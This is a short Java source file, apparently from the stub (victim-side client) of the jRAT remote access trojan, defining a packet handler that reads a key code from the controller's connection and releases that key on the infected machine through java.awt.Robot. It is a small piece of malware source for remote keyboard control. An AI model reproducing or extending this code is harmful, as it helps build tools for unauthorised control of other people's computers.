package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Main;

public class Packet95KeyRelease extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int btn = Connection.instance.readInt();
		try {
			Main.robot.keyRelease(btn);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
